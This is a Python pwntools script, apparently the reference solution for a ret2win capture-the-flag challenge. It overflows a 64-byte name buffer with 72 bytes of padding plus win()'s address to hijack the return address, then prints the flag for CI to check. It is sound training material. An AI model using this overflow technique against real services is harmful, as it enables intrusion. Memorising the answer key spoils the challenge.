#!/usr/bin/env python3
"""Reference exploit for pwn1 (formerly ret2win).

Overflow the 64-byte `name` buffer, overwrite the saved return address with the
address of win(). Padding = 64 (buffer) + 8 (saved rbp) = 72 bytes.

Run against the local docker-compose service (default) or a remote instance:

    python solve.py                 # localhost:9001
    python solve.py HOST PORT       # remote

Prints the recovered flag to stdout so verify.py / CI can assert on it.
"""
import os
import sys

from pwn import ELF, context, remote  # pip install pwntools

context.log_level = "error"

HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("HOST", "127.0.0.1")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", 9001))

# Resolve win() from the local copy of the binary. In CI we build it out of the
# container; if it is not present, fall back to the known no-PIE address.
BIN = os.path.join(os.path.dirname(__file__), "..", "build", "vuln")


def win_addr() -> int:
    if os.path.exists(BIN):
        return ELF(BIN, checksec=False).symbols["win"]
    # no-PIE binaries load at a fixed base; adjust if you rebuild.
    raise SystemExit("build/vuln not found -- run: make -C .. build")


def main() -> int:
    offset = 72  # 64 buf + 8 saved rbp
    win = win_addr()
    payload = b"A" * offset + win.to_bytes(8, "little")  # little-endian p64(win)

    io = remote(HOST, PORT)
    io.recvuntil(b"name?")
    io.sendline(payload)
    io.recvline()  # "Hello, AAAA..."
    data = io.recvall(timeout=3)
    io.close()

    text = data.decode(errors="replace")
    for line in text.splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return 0
    sys.stderr.write("no flag recovered; got:\n" + text + "\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
